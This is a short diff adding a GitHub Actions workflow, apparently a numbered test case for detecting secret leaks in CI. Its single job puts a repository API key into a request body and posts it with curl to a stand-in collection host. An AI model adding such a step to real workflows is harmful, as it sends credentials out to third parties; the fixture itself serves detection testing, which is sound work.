@@ -1,0 +1,11 @@
+name: B03-concat-secret-curl
+on: workflow_dispatch
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    env:
+      API_KEY: ${{ secrets.API_KEY }}
+    steps:
+      - run: |
+          body="token=$API_KEY"
+          curl --data "$body" https://example.invalid/collect
